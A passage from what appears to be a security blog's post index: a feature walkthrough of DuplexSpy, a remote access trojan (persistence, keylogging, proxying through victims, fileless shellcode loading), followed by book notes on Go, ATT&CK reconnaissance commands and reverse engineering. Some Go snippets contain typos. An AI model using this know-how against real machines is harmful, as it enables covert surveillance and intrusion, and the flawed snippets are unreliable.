issues were discovered in the other two. These will be addressed in a future release.\nTo generate a payload, click Build on the home page.\n\n\n\nPersistenceDuplexSpy provides two persistence methods. The first one is copy the payload to StartUp directory, and the second method is modifying the registry data. The latter method is called at the end of copying file.\nInfectedLike other remote access tools, the target can be infected by directly executing the .exe file. Once the remote machine is compromised and successfully connects to the server, it will appear as an available item on the home page.\nIf you see this, congratulations, you can now use the provided functions.\n\n\n\nThe context menu displays all available functions.\nManagerThe Manager provides the following remote administration features:\n\nFile Manager\nTask Manager\nService Manager\nRegistry Editor\nConnection View\nWindow Manager\n\nFile ManagerThe File Manager provides the following functions:\n\nShow Image\nNew\nEdit\nCopy\nPaste\nMove\nDelete\nUpload\nDownload\nWGET\nArchive\nDatetime\nShortcut\nCopy Path\n\nToolbar functions:\n\nHome\nParent\nRefresh\nNew\nSelect\nExecute\nShell\nFind\n\n\n\n\n\n\n\nTask Manager\nInjector – Perform DLL or shellcode injection, click this to learn more about this feature.\nStart:\nKill\nKill + Delete\nSuspend\nResume\nCopy\nFind Antivirus\n\n\n\n\nRegEditDuplexSpy implements a simple registry editor with a GUI similar to regedit.exe\n\n\n\nServiceDisplays all Windows services on the compromised machine.\n\n\n\nConnectionDisplays all active network connections.\n\n\n\nWindowDisplays all open windows and provides the following features:\n\nCapture\nGetDC\nForeground\n\n\nGo to TaskMgr\nCopy\nThread\nSuspend\nResume\n\n\n\n\n\n\n\n\n\nTerminalDuplexSpy provides two types of cmd.exe terminal and a WQL console.\nVirtual TerminalA traditional virtual terminal commonly found in RATs.\n\n\n\nXterm TerminalInspired by MobaXterm, this terminal provides an interactive console supporting tools such as:\n\nnc.exe\npython\nnmap\nsqlmap\nssh\ntelnet\nnetsh\n\n\n\n\nWQL\n\n\nDesktop\n\n\nWebcam\n\n\nAudioCaptures audio streams from microphones or speakers. The received audio can be saved as an .mp3 file.\nFunStuffInspired by the classic Beast RAT, this module provides a collection of interactive and demonstrative features, including:\n\nMessageBox\nBalloon Tips\nToggle\nMouse\nHide / Show the mouse cursor\nLock / Unlock the mouse cursor\nEnable / Disable mouse trails\n\n\nhWnd\nHide / Show the system tray\nHide / Show the system clock\nHide / Show the taskbar\nHide / Show the Start Orb (the Start button at the lower-left corner of the screen)\n\n\nKeyboard\nSmile: Replace all keyboard input with a smiley face. For example, typing HelloWorld will result in ten 😊 characters.\nEnable / Disable keyboard input\n\n\n\n\nImage\nWallpaper: Change or retrieve the current wallpaper of the compromised machine\nLockScreen: Display a specified image while disabling keyboard input and hiding the mouse cursor\n\n\n\nProxyThe Proxy feature is designed to demonstrate a common misconception: some people believe that compromising their computer is harmless because it contains no important data. This assumption is incorrect. Even if no sensitive data is present, a compromised machine can still be abused as a proxy to conceal the attacker’s real identity.\nThe Proxy function establishes a listener on the C2 server and accepts SOCKS5 connections from users. Network traffic is then forwarded through the compromised machine. The overall architecture is illustrated below:\n\n\n\nThis feature allows attackers to browse the internet, watch YouTube, or even perform SSH logins to remote servers through the compromised host.\nTo learn more, please click here.\nMiscKeyloggerYears ago, when I was a beginner in cybersecurity, I was curious about how a keylogger could endanger user credentials if it only logged keystrokes. Later, I realized that the issue lies in practical design rather than raw data itself.\nDuplexSpy demonstrates how an offensive keylogger is implemented—not only recording the keys pressed by the user, but also capturing the timestamp and the active window title.\n\n\n\nChat MessageThis feature allows you to have a conversation with the user who is currently logged on to the compromised machine.Currently, it supports single-user sessions and text messages only.\nRun ScriptExecute customized scripts. DuplexSpy provides three types of executable scripts:\n\nBatch\nC#\nVB.NET\n\nBoth C# and VB.NET scripts are executed filelessly, while Batch scripts are not.\nPC PowerThis function includes:\n\nRestart\nLogout\nShutdown\nSleep\n\nAll actions will be executed after a specified delay.Note that the compromised machine will be disconnected after the action is triggered.\nFileless ExecutionThis feature allows you to execute a PE file without writing it to disk (fileless execution).\nTo learn more, please click this.\nDLL LoaderThis feature writes a DLL to a temporary file (%temp%) and loads it using Win32 APIs.Note that this feature is not fileless.\nTo learn more, please click this.\nShellcode LoaderLoad shellcode directly into memory. This feature IS FILELESS.\nTo learn more, please click this.\nPluginThis feature allows you to load a .NET Framework 4.8 assembly into memory, pass parameters to it, and execute customized functions.\nTo learn more, please click this.\nBatchFor convenience, DuplexSpy provides several features grouped under Batch.These functions allow you to execute multiple operations or commands described above in a single workflow.\nDesktopThis idea is inspired by CCTV monitoring systems.Each page displays up to 9 desktops.\nWebcamThis idea is also inspired by CCTV monitoring systems.Each page displays up to 9 webcams. Unlike Multi-Desktop, webcam images are not displayed automatically.\nLock ScreenThis idea comes from the comic Keroro Gunso.In the story, an alien character hijacks multiple computers and displays a star logo while their team invades Earth.\n\n\n\n\n\n\n\n\n\n\n\n\nRun ScriptSend customized scripts to compromised machines.\n\n\n\n\n\n\nURLOpen a URL or download an executable from a specified URL.\n\n\n\nConnection\nReconnect: Notify the remote computer to reconnect to the server.\nDisconnect: Notify the remote computer to disconnect from the server. The payload will be terminated.\n\nClient\nSleep: Disconnect from the C2 server and reconnect after a specified delay.\nUpdate: Send a new payload to the compromised machine, delete the old payload, and execute the new one (not fileless).\nRemove: Terminate and delete the payload on the compromised machine.\n\nLocalSome functions are executed on your server only:\n\nOpen Folder: When a compromised machine is online, DuplexSpy creates a dedicated folder for it. This feature allows you to open the folder via explorer.exe.\nHighlight: Highlight the selected items.\n\nCopyThis function also runs on your server only.It allows you to copy the online ID or IPv4 address to your clipboard.\nTHANKS FOR READING!\n","categories":["Tools\\DuplexSpy"],"tags":["Code","C#","Program","DuplexSpy","RAT"]},{"title":"[Book] Learning Go","url":"/2026/01/05/2026-1-5-LearningGo/","content":"El libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “Learning Go”.The content will be continuously updated as I read through the book.\nChapter.1 - Setting Up Your Go EnvironmentThe go commandpackage mainimport &quot;fmt&quot;func main() &#123;    fmt.Println(&quot;Hello, world!&quot;)&#125;\n&gt; go run hello.go\n&gt; go build hello.go\nThis creates an executable called hello (or hello.exe on Windows) in the current directory.\nMakefilesHere’s a sample Makefile to add to our very simple project:.DEFAULT_GOAL := buildfmt:    go fmt ./....PHONY:fmtlint: fmt    golint ./....PHONY: lintvet: fmt    go vet ./....PHONY:vetbuild: vetgo build hello.go.PHONY:buildEach possible operation is called a target. The .DEFAULT_GOAL defines which target is run when no target is specified. In our case, we are going to run the build target.\nThe world before the colon (:) is the name of the target. Any words after the target (like vet in the line build: vet) are the other targets that must be run before the specified target runs. The taks that are performed by the target are on the indented lines after the target (The)\nOnce theMakefile is in your directory, type:&gt; make\nChapter.2 - Primative Types and DeclarationsComplex Numberfunc main() &#123;    x := complex(2.5, 3.1)    y := complex(10.2, 2)    fmt.Println(x + y)&#125;\nvar vs. :=var x int = 10\nvar x = 10\nvar x int\nvar x, y int = 10, 20\nvar x, y int\nvar x, y = 10, &quot;hello&quot;\nvar (    x int    y = 20    z int = 30    d, e, = 40, &quot;hello&quot;    f, g string)\nvar x = 10x := 10\nvar x, y = 10, &quot;hello&quot;x, y := 10, &quot;hello&quot;\nx := 10x, y := 30, &quot;hello&quot;\nconstCode:const x int64 = 10const (    idKey = &quot;id&quot;    nameKey = &quot;name&quot;)const z = 20 * 10func main() &#123;    const y = &quot;hello&quot;        fmt.Println(x)    fmt.Println(y)    x = x + 1    y = &quot;bye&quot;    fmt.Println(x)    fmt.Println(y)&#125;Output:./prog.go:21:2: cannot assign to x (neither addressable nor a map index expression)./prog.go:22:2: cannot assign to y (neither addressable nor a map index expression)Go build failed.\n\nTyped and Untyped ConstantUntyped constant:const x = 10\nAll of the following assignments are legal:var y int = xvar x float64 = xvar d byte = x\nHere’s what a typed constant declaration looks like:const typedX int = 10This constant can only be assigned directly to an int. Assigning it to any other type produces a compile-time error.\nUnused Variablesfunc main() &#123;    x := 10    x = 20    fmt.Println(x)    x = 30&#125;\nThe Go compiler allows you to create unread constants with const. This is because constants in Go are calculated at compile time and cannot have any side effects. This makes them easy to eliminate: if a constant isn’t used, it is simply not included in the compiled binary.\nNaming Variables and Constants//Example 2-4. Variable names you should never use_0 := 0_0_𝟙 := 20π := 3 //piａ := &quot;hello&quot; //Full-width (Shift + Space)fmt.Println(_0)fmt.Println(_𝟙)fmt.Println(π)fmt.Println(ａ)\nasdWhile this code works DO NOT name your variable like this.\nChapter.3 - Composite TypesArrays——Too Rigid to Use DirectlyArrays are rarely used directly in Go.\nAll of the elements in the array must be of the type that’s specified (this doesn’t mean they are always of the same type). There are a few different declaration styles.var x [3]int\nvar x = [3]int&#123;10, 20, 30&#125;\nvar x = [12]int&#123;1, 5: 4, 6, 10: 100, 15&#125;//This creates an array of 12 ints with the following values: [1, 0, 0, 0, 0, 4, 6, 0, 0, 0,100, 15].\nWhen using an array literal to initialize an array, you can leave off the number and use ... instead:var x = [...]int&#123;10, 20, 30&#125;\nYou can use == and != to compare arrays:var x = [...]int&#123;1, 2, 3&#125;var y = [3]int&#123;1, 2, 3&#125;fmt.Println(x == y) // prints true\nGo only has one-dimensional arrays, but you can simulate multidimensional arrays:var x [2][3]intThis declares x to be an array of length 2 whose type is an array of ints of length 3.\nNote that you cannot read or write past the end of an array or use negative index. If you do this with a constant or literal index, it is a compile-time error.\nFinally, the built-in funciton len takes in an array and returns its length:fmt.Println(len(x))\nGo considers the size of the array to be part of the type of the array. This makes an array that’s declared to be [3]int a different type from an array that’s declared to be [4]int. This also means that you cannot use a variable to specify the size of an array, because types must be resolved at compile time, not at runtime.\nYou cannot use a type conversion to convert arrays of different sizes to identical types.\nSlicesMost of the time, when you want a data structure that holds a sequence of values, a slice is what you should use. WHat makes slices so useful is that the length is not part of the type for a slice.\nvar x = []int&#123;10, 20, 30&#125;\n\nUsing [...] makes an array. Using [] makes a slice.\n\nvar x = []int&#123;1, 5: 4, 6, 10: 100, 15&#125;\n\nYou can simulate multidimensional slices and make a slice of slices:var x [][]int\n\nx[0] = 10fmt.Println(x[2])\n\nIn Go, nil is an identifier that represents the lack of a value for some types. Like the untyped numeric constants we saw in the previous chapter,nil has no type, so it can be assigned or compared against values of different types. A nil slice contains nothing.\nA slice is the type that isn’t comparable. It is a compile-time error to use == to see if two slices are identical or != to see if they are different. The only thing you can compare a slice with is nil:\nfmt.Println(x == nil)\nappendThe built-in append function is used to grow slicesvar x []intx = append(x, 10)\n\nThe append function takes at least two parameters, a slice of any type and a value of that type. It returns a slice of the same type.var x = []int&#123;1, 2, 3&#125;x = append(x, 4)\n\nYou can append more than one value at a time:x = append(x, 5, 6, 7)\nCapacityvar x[]intfmt.Println(x, len(x), cap(x))x = append(x, 10)fmt.Println(x, len(x), cap(x))x = append(x, 20)fmt.Println(x, len(x), cap(x))x = append(x, 30)fmt.Println(x, len(x), cap(x))x = append(x, 40)fmt.Println(x, len(x), cap(x))x = append(x, 50)fmt.Println(x, len(x), cap(x))\nmakeThis built-in make function allows us to create an empty slice that already has a length or capacity specified. It allows us to specify the type, length, and, optionally, he capacity.x := make([]int, 5)\nx := make([]int, 5)x = append(x, 10)\nx := make([]int, 5, 10)\nYou can also create a slice with zero length, but a capacity that’s greater than zero:x := make([]int, 0, 10)In this case, we have a non-nil slice with a length of 0, but a capacity of 10. Since the length is 0, we can’t directly index into it, but we can append values to it:x := make([]int, 0, 10)x = append(x, 5, 6, 7, 8)The value of x is now [5 6 7 8], with a length of 4 and a capacity of 10.\n\nNever specify a capacity that’s less than the length! It is a compil-time error to do so with a constant or numeric literal. If you use a variable to specify a capacity that’s smaller than the length, your program will panic at runtime.\n\nDeclaring Yoyr Slice//Example 3-2: Declaring a slice that might stay nilvar data []int\nYou can create a slice using an empty slice literal:var x = []int&#123;&#125;\nDeclaring a slice with default valuesdata := []int&#123;2, 4, 6, 8&#125; //numbers we appreciate\nSlicing SlicesA slice expression creates a slice from a slice. It’s written inside brackets and consists of a starting offset and an ending offset, separated by a colon (:).x := []int&#123;1, 2, 3, 4&#125;y := x[:2]z := x[1:]d := x[1:3]e := x[:]fmt.Println(&quot;x:&quot;, x)fmt.Println(&quot;y:&quot;, y)fmt.Println(&quot;z:&quot;, z)fmt.Println(&quot;d:&quot;, d)fmt.Println(&quot;e:&quot;, e)Output:x: [1 2 3 4]y: [1 2]z: [2 3 4]d: [2 3]e: [1 2 3 4]\n\nWhen you take a slice from a slice, you are NOT making a copy of the data. Instead, you now have two variables that are sharing memory. This means that changes to an element in a slice affect al slices that share that element.\nx := []int&#123;1, 2, 3, 4&#125;y := x[:2]z := x[1:]x[1] = 20y[0] = 10z[1] = 30fmt.Println(&quot;x:&quot;, x)fmt.Println(&quot;y:&quot;, y)fmt.Println(&quot;z:&quot;, z)\nOutput:x: [10 20 30 4]y: [10 20]z: [20 30 4]\n\nSlicing slices gets extra confusing when combined with append:x := []int&#123;1, 2, 3, 4&#125;y := x[:2]fmt.Println(cap(x), cap(y))y = append(y, 30)fmt.Println(&quot;x: &quot;, x)fmt.Println(&quot;y: &quot;, y)Output:4 4x:  [1 2 30 4]y:  [1 2 30]\nWhenever you take a slice from another slice, the subslice’s capacity is set to the capacity of the original slice, minus the offset of the subslice within the original slice. This means that any unused capacity in the original slice is also shared with any subslices.\nWhen we make the y slice from x, the length is set to 2, but the capacity is set to 4, the same as x. Since the capacity is 4, appending onto the end of y puts the value in the third position of x.\nThis behavior creates some very odd scenarios, with multiple slices appending and overwriting each other’s data:\n//A more confusing examplex := make([]int, 0, 5)x = append(x, 1, 2, 3, 4)y := x[:2]z := x[2:]fmt.Println(cap(x), cap(y), cap(z))y = append(y, 30, 40, 50)x = append(x, 60)z = append(z, 70)fmt.Println(&quot;x:&quot;, x)fmt.Println(&quot;y:&quot;, y)fmt.Println(&quot;z:&quot;, z)\nOutput:5 5 3x: [1 2 30 40 70]y: [1 2 30 40 70]z: [30 40 70]\nTo avoid complicated slice situations, you should either never use append with a subslice or make sure that append doesn’t cause an overwrite by using a full slice expression:y := x[:2:2]z := x[2:4:4]\nConverting Arrays to Slicesx := [4]int&#123;5, 6, 7, 8&#125;y := x[:2]z := x[2:]x[0] = 10fmt.Println(&quot;x:&quot;, x)fmt.Println(&quot;y:&quot;, y)\nOutput:x: [10 6 7 8]y: [10 6]z: [7 8]\ncopyx := []int&#123;1, 2, 3, 4&#125;y := make([]int, 4)num := copy(y, x)fmt.Println(y, num)\nOutput:[1 2 3 4] 4\n\nx := []int&#123;1, 2, 3, 4&#125;y := make([]int, 2)copy(y, x[2:])\n\nx := []int&#123;1, 2, 3, 4&#125;num = copy(x[:3], x[1:])fmt.Println(x, num)\n\nx := []int&#123;1, 2, 3, 4&#125;d := [4]int&#123;5, 6, 7, 8&#125;y := make([]int, 2)copy(y, d[:])fmt.Println(y)copy(d[:], x)\nOutput:[5 6][1 2 3 4]\nStrings and Runes and Bytesvar s string = &quot;Hello there&quot;var b byte = s[6]\nvar s string = &quot;Hello there&quot;var s2 string = s[4:7]var s3 string = s[:5]var s4 string = s[6:]\nMaps\nmap[keyType]valueTypevar nilMap map[string]inttotalWins := map[string]int&#123;&#125;teams := map[string][]string &#123;    &quot;Orcas&quot;: []string&#123;&quot;Fred&quot;, &quot;Ralph&quot;, &quot;Bijou&quot;&#125;,    &quot;Lions&quot;: []string&#123;&quot;Sarah&quot;, &quot;Peter&quot;, &quot;Billie&quot;&#125;,    &quot;Kittens&quot;: []string&#123;&quot;Waldo&quot;, &quot;Raul&quot;, &quot;Ze&quot;&#125;,&#125;ages := make(map[int][]string, 10)\n\n\nMaps automatically grow as you add key-value pairs to them.\nIf you know how many key-value pairs you plan to insert into a map, you can use make to create a map with a specific initial size.\nPassing a map to the len function tells you the number of key-value pairs in a map.\nThe zero value for a map is nil\nMaps are not comparable. You can check if they are equal to nil, but you cannot check if two maps have identical keys and values using == or differ using !=\n\nThe key for a map can be any comparable type. This means you cannot use a slice or a map as the key for a map.\n\nLearn more about hash map: GopherCon 2016, Inside theMap Implementation.\n\nReading and Writing a MaptotalWins := map[string]int&#123;&#125;totalWins[&quot;Orcas&quot;] = 1totalWins[&quot;Lions&quot;] = 2fmt.Println(totalWins[&quot;Orcas&quot;])fmt.Println(totalWins[&quot;Kittens&quot;]) //Output: 0totalWins[&quot;Kittens&quot;]++fmt.Println(totalWins[&quot;Kittens&quot;]) //Output: 1totalWins[&quot;Lions&quot;] = 3fmt.Println(totalWins[&quot;Lions&quot;])\nThe comma ok Idiomm := map[string]int&#123;    &quot;hello&quot;: 5,    &quot;world&quot;: 0,&#125;v, ok := m[&quot;hello&quot;]fmt.Println(v, ok)v, ok := m[&quot;world&quot;]fmt.Println(v, ok)v, ok := m[&quot;goodbye&quot;]fmt.Println(v, ok)\nRather than assign the result of a map read to a single variable, with the comma ok idiom you assign the results of a map read to two variables. The first gets the value associated with the key. The second value returned is a bool. It is usually named ok. If ok is true, the key is present in the map. If ok is false, the key is not present.\nDeleting from Mapsm := map[string]int&#123;    &quot;hello&quot;: 5,    &quot;world&quot;: 10,&#125;delete(m, &quot;hello&quot;)\nUsing Maps as SetsintSet := map[int]bool&#123;&#125;vals := []int&#123;5, 10, 2, 5, 8, 7, 3, 9, 1, 2, 10&#125;for _, v := range vals &#123;    intSet[v] = true&#125;fmt.Println(len(vals), len(intSet))fmt.Println(intSet[5])fmt.Println(intSet(500))if intSet[100] &#123;    fmt.Println(&quot;100 is in the set&quot;)&#125;\nStructsGo doesn’t have classes, because it doesn’t have inheritance. This doesn’t mean Go doesn’t have some of the features of object-oriented languages, it just does things a little differently.\ntype person struct &#123;    name string    age int    pet string&#125;\nvar fred person\nbob := personP&#123;&#125;\njulia := person&#123;    &quot;Julia&quot;,    40,    &quot;cat&quot;,&#125;\nbeth := person&#123;    age: 30,    name; &quot;Beth&quot;,&#125;\nbeth.name = &quot;Bob&quot;fmt.Println(beth.name)\nAnonymous Structsvar person struct &#123;    name string    age int    pet string&#125;person.name = &quot;bob&quot;person.age = 50person.pet = &quot;dog&quot;pet := struct &#123;    name string    kind string&#125;&#123;    name: &quot;Fido&quot;,    kind: &quot;dog&quot;,&#125;\nComparing and Converting StructsWhether or not a struct is comparable depends on the struct’s field. Structs that are entirely composed of comparable types are comparable; those with slice or mmap fields are not.\ntype firstPerson struct &#123;    name string    age int&#125;\nWe can use a type conversion to convert an instance of firstPerson to secondPerson, but we cannot use == to compare an instance of firstPerson and an instance of secondPerson, because they are different types:type secondPerson struct &#123;    name string    age int&#125;We can’t convert an instance of firstPerson to thirdPerson, because the fields are in different order:type thirdPerson struct &#123;    age int    name string&#125;We can’t convert an instance of firstPerson to fourthPerson, because the fields names don’t match:type fourthPerson struct &#123;    firstName string    age int&#125;we can’t convert an instance of firstPerson to fifthPerson because there’san additional field:type fifthPerson struct &#123;    name string    age int    favoriteColor string&#125;Anonymous structs add a small twist to this: if two struct variables are being comparedand at least one of them has a type that’s an anonymous struct, you can comparethem without a type conversion if the fields of both structs have the same names,order, and typestype firstPerson struct &#123;    name string    age int&#125;f := firstPerson&#123;    name: &quot;Bob&quot;,    age: 50,&#125;var g struct &#123;    name string    age int&#125;// compiles -- can use = and == between identical named and anonymous structsg = ffmt.Println(f == g)\nChapter.4 - Blocks, Shadows, and Control StructuresBlocksEach place where a declaration occurs is called a block. Variables, constants, types, and functions declared outside of any functions are placed in the package block.\nShadowing Variablesfunc main() &#123;    x := 10    if x &gt; 5 &#123;        fmt.Println(x)        x := 5        fmt.Println(x)    &#125;    fmt.Println(x)&#125;\nOutput:10510A shadowing variable is a variable that has the same name as a variable in a containing block. For as long as the shadowing variable exists, you cannot access a shadowed variable.\n\nfunc main() &#123;\tx := 10\tif x &gt; 5 &#123;\t\tx, y := 5, 20\t\tfmt.Println(x, y)\t&#125;\tfmt.Println(x)&#125;\nOutput:5 2010\n\nChapter.5 - FunctionsChapter.6 - PointersChapter.7 - Types, Methods, and InterfacesChapter.8 - Errors","categories":["Book"],"tags":["Book","Learning","Study","Note","Code","Programming","Coding","Program","Go-Lang","Go"]},{"title":"[Book] Programming Rust","url":"/2026/01/05/2026-1-5-ProgrammingRust/","content":"El libro\n\n\nIntroductionReflection","categories":["Book"],"tags":["Book","Learning","Study","Note","Code","Programming","Coding","Program","Rust"]},{"title":"[Book] Practical Guide To Red-Blue Confrontation From ATT&CK","url":"/2026/01/05/2026-1-5-RedBlueConfrontationFromAttCk/","content":"El libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “Practical Guide To Red-Blue Confrontation From ATT&amp;CK”.The content will be continuously updated as I read through the book.\nReflectionThis book introduces many practical cybersecurity attack techniques from the perspective of the MITRE ATT&amp;CK framework.\nThe majority of the content focuses on attack methods targeting the Windows platform, while Linux is also mentioned in several chapters.\nCompared to several books that I have read before (click this one, this one and this one), there are overlapping topics, and most of them primarily discuss Windows security.\nHowever, this book presents tool usage and penetration techniques in a more practical and broader manner. I believe this is a good book for strengthening your fundamental cybersecurity knowledge and skills, especially if you have already read the three books that I mentioned above.\nThis book including:\n\nWindows Protocols\nTunneling\nProxy/Reverse Proxy\nPort Forwarding\nLateral(Horizontal) Movement\nMany Many Tools\nPersistence\nSeveral well-known rootkits\n\nThis book not including:\n\nThe underlying principles of Windows Protocols.\nThe deep, underlying principles of different methods, such as, port forwarding.\nThe underlying principles of exploits.\nHow to mastering Cobalt Strike.\n\nThere are typo and several mistakes about Windows Protocols, reader should study them and do the double-check with the official documents.\nThis book is suitable for readers who want a practical overview of offensive techniques rather than a deep understanding of underlying mechanisms.\n\n\n\nChapter.1 - Fundamentals of Windows Security1.1 - Fundamentals of Windows Authentication\nSSPI\nSSP\nWell-Known SSP\nNTLM\nKerberos\nNegotiate\nSecurity Channel\nDigest Authentication\nCred SSP\nDistributed Password Authentication\nPKU2U\n\n\n\n1.3 - Security Authentication Mechanism of WindowsNTLMKerberos\nPorts used by Kerberos:\nTCP/UDP 88: Authentication and Tickets\nTCP/UDP 464: Kerberos Kpaswd(Reset Password) protocol.\nLDAP: 389\nLDAPS: 636\n\n\n\nTerminology of Kerberos| Term | Meaning || —- | —- || AS | Authentication Service. || KDC | Key Distrubution Center. (Domain controller, the most important server in a domain). || TGT | Ticket Granting Ticket. || TGS | Ticket Granting Service. || ST | Service Ticket. || krbtgt | Every domain has account for krbtgt. || Principal | A unique identity to which Kerberos can assign tickets. || PAC | Privilege Attribute Certificate. || SPN | Servic Principal Name. || Session Key | A temporary key. || Server Session Key | A temporary key. || Authenticator | Encryted with Session Key. || Replay Cache | It has added since Kerberos 5. |\nAn Overview of Kerberos Authentication\nClient demonstrates it has the correct password by encrypting timestamp with its NTLM hash. This process is also know as pre-authentication.\nAfter successful pre-authentication, the client requests a TGT (Ticket Granting Ticket) from the Authentication Server (AS), which is typically a DC (Domain Controller).\nThe client presents its TGT to TGS (Ticket Granting Server) to request access to a specific service. If the TGT is valid, the client receives a ST (Service Ticket) from the KDC’s TGS.\nClient is allowed to access the service on the target server if both the ST and the service authentication are valid\n\nDetails of Kerberos Authentication\nAS-REQ and AS-REP (Interaction between client and AS):\nAS-REQ:\\When a client wants to access resources within a domain, after the user enters a username and password, the client sends an AS-REQ message to the Authentication Server (AS).\\The request includes information such as the message type, protocol version, client principal name (username), and pre-authentication.\\To prove knowledge of the password, the client encrypts a timestamp using a key derived from the user’s NTLM hash. This encrypted timestamp is included as pre-authentication data.\\The AS decrypts the timestamp to verify the client’s credentials. If the verification succeeds, the AS responds with an AS-REP message containing a Ticket Granting Ticket (TGT).\nAS-REP:\n\n\nTGS-REQ and TGS-REP (Interaction between client and TGS):\nTGS-REQ:\nTGS-REP:\n\n\nAP-REQ and AP-REP (Interaction between client and server):\nAP-REQ:\nAP-REP:\n\n\n\n1.4 - Windows ProtocolsLLMNRLLMNR (Link-Local Multicast Name Resolution)\nLLMNR Spoofing\nNetBIOSNetBIOS (Network Basic Input/Output System)\nWPADWPAD (Web Proxy Auto-Discovery) Protocol\n1.5 - WMIWMI (Windows Management Instructmentation) is the essential of Windows XP/2000 system management. User can perform local or remote resource management.\nIt supports DCOM (Distributed Component Object Model) and WinRM (Windows Remote Management). It is a useful tool for Win32 operating system. On the other hand, it is a useful tool for fileless attack.\nWQLWQL (WMI Query Language) is a SQL of WMI, it has a similar syntaxs to SQL. However, WQL can only be used for data query, it is not allowed to do creation, delete or modification to the instance of a class.\nExample of QueryingBasic usage:SELECT properties[, properties] FROM class [where clause]\n\n&gt; wbemtest\nWMI Client\nPowerShell\nGet-WmiObject\nGet-CimAssociatedInstance\nGet-CimClass\nGet-CimInstance\nGet-CimSession\nSet-WmiInstance\nSet-CimInstance\nInvoke-WmiMethod\nInvoke-CimMethod\nNew-CimInstance\nNew-CimSession\nNew-CimSessionOption\nRegister-CimIndicationEvent\nRegister-WmiEvent\nRemove-CimInstance\nRemove-WmiObject\nRemove-CimSession\n\n\nWBEMTEST\nWinRM\nWin explorer\nWSH\n\nWMI Remote Interactive\nDCOM:\\DCOM (Distributed Component Object Model) is a set of APIs based on COM, introduced by Microsoft. Before understanding DCOM, it is necessary to understand COM.\\COM (Component Object Model) is a standard defined by Microsoft that specifies how software components communicate with each other on the same machine. It allows a client to interact with a component directly, without the need for any intermediate component.\\DCOM is an extension of COM that enables clients to use COM objects not only locally but also remotely over a network. This functionality is implemented using RPC (Remote Procedure Call).\\DCOM enhances COM by providing support for distributed computing, multiple network protocols, and secure communication.\nWinRM\n\nWMI EventsAttacking WMI\nInformation Extraction\nComputer/System Information: Win32_OperatingSystem, Win32_ComputerSystem\nFile/Directory: CIM_DataFile\nDesk: Win32_Volume\nRegistry: StdRegProv\nProcess: Win32_Process\nService: Win32_Service\nEvent: Win32_NtLogEvent\nLogged Account: Win32_LoggedOnUser, Win32_LogonSession\nSharing: Win32_Share\nHotfix: Win32_QuickFixEngineering\nNetwork: Win32_IP4RouteTable\nUser Account: Win32_UserAccount\nUser Group: Win32_Group\n\n\nAnti-VirusSELECT * FROM AntiVirusProduct\nLateral Movement\n\nChapter.2 - Information Extraction2.1 - Host EnumerationPing&gt; for /l %i in (1,1,255) do @ping x.x.x.%i -w 1 -n 1 | find /i &quot;ttl&quot;\nARP\n&gt; net use\n&gt; net session\n&gt; ipconfig /displaydns\n2.2 - Information Extraction on WindowsUser’s Information and Privilege\n\n\n\nCommand\nDescription\n\n\n\n\nnet user\n\n\nnet localgroup administrators\n\n\nquery user\n\n\nwhoami /all\n\n\nwhoami &amp;&amp; whomai /priv\n\n\nnet localgroup\n\n\n\n\nSystem Information\n\n\n\nCommand\nDescription\n\n\n\n\nipconfig /all\n\n\nwmic service list brief\n\n\n\n\nNetwork Information2.2 - Information Extraction on LinuxChapter.3 - TunnelingChapter.4 - Privilege EscalationWindows Privilege EscalationBad ConfigurationDLL HijackingPrivilege Escalation with 3rd Service\nMySQL UDF\nWhat is UDF\nHow to do escalation  mysql&gt; select @@plugin_dir;mysql&gt; show variables like, %plugin%;    \n\n\n\n\nChapter.5 - Credentials ExtractionChapter.6 - Lateral MovementChapter.7 - PersistenceThanks for reading!\n","categories":["Book"],"tags":["Linux","Book","Learning","Hacking","Hack","Penetration","PrivilegeEscalation","Security","CyberSecurity","ATT&CK","Pentesting","ActiveDirectory","Windows"]},{"title":"[Book] Reverse Engineering Core (리버스 엔지니어링 핵심 원리)","url":"/2026/01/04/2026-1-4-BookReverseEngineeringCore/","content":"El libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “Reverse Engineering Core”.The content will be continuously updated as I read through the book.\nReflectionFinally, I have completed this book.\n\n\n\nI had always wanted to read this book. Unfortunately, due to personal issues, I was unable to do so for a long time. Therefore, I am glad that I finally finished it.\nThis book was originally written in Korean. It also has a Simplified Chinese translation. Unfortunately, I have not found an English version. Perhaps this is because there are already many books on reverse engineering written in English.\nThis book describes the underlying principles of reverse engineering in both theoretical and practical ways.\nIt introduces how to perform software reverse engineering on the Windows platform using tools such as OllyDbg, WinDbg, and PEView. IDA is rarely discussed. Therefore, this book is especially suitable for readers who want to master OllyDbg.\nThis book DOES NOT cover kernel debugging.\n\n\n\nThe book also provides both source code and compiled PE files for all chapters. This is a significant advantage for hands-on practice, because compiling the code yourself may produce different results depending on the environment. In addition, some of the provided code examples are difficult to find on the internet.\nThis book includes:\n\nReverse engineering on Windows\nOllyDbg\nWinDbg\nPE file format\nWindows API\nTechniques for improving reverse engineering skills\nThe author’s experience (the author previously worked for an enterprise developing anti-virus software)\nAdvanced debugging\nAnti-debugging\nAdvanced anti-debugging\nAnti-anti-debugging\nCode injection\nDLL injection\nApplication patching\netc.\n\nThis book does not include:\n\nKernel debugging\nIDA Pro\nGhidra\nReverse engineering on Linux\nReverse engineering of Android APKs\nReverse engineering of iOS applications\n\nPrerequisites (Recommended):\n\nBasic knowledge of C/C++\nBasic knowledge of the Win32 API\nBasic understanding of Windows\nPassion, patience, and the ability to use Google\n\nYou may feel frustrated during the process of reverse engineering. However, the author also mentioned that he experienced similar frustration.\n\n\n\nChapter 1 - Reverse EngineeringMurmur….\nBlahblahblah….\nThis chapter introduces the background and basic knowledge of reverse engineering.\nChapter 2 - Hello World!2.2 - DebuggingBasic commands of OllyDbg:\n\n\n\n\nCommand\nHotkey\nDescription\n\n\n\n\nRestart\nCtrl+F2\nRestart debugging.\n\n\nStep Into\nF7\nExecute an OP code. If the OP code is CALL, then go into the called code.\n\n\nStep Over\nF8\nExecute an OP code. If the OP code is CALL, then just execute the code rather then go into the called code.\n\n\nExecute till Return\nCtrl+F9\nKeep executing code until it reached RETN\n\n\n\n\n#include &quot;windows.h&quot;#include &quot;tchar.h&quot;int _tmain(int argc, TCHAR *argv[])&#123;    MessageBox(        NULL,         L&quot;Hello World!&quot;,         L&quot;www.reversecre.com&quot;,         MB_OK    );    return 0;&#125;\n\n\n\nThis is the main() function of HelloWorld.exe\n2.3 - Getting Familar with Debugger\n\n\n\nCommand\nHotkey\nDescription\n\n\n\n\nGo 